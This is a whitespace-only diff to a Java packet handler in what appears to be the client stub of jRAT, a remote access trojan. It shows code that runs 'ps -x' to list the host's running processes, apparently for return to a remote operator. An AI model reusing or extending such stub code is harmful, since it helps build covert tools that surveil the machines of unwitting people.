@@ -7,8 +7,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet20Process;
 
-
-
 public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 	@Override
@@ -20,12 +18,12 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			} else {
 				p = Runtime.getRuntime().exec("ps -x");
 			}
-			
+
 			if (p != null) {
 				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
 				String line;
-				
+
 				while ((line = input.readLine()) != null) {
 					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 						if (line.trim().length() > 0) {
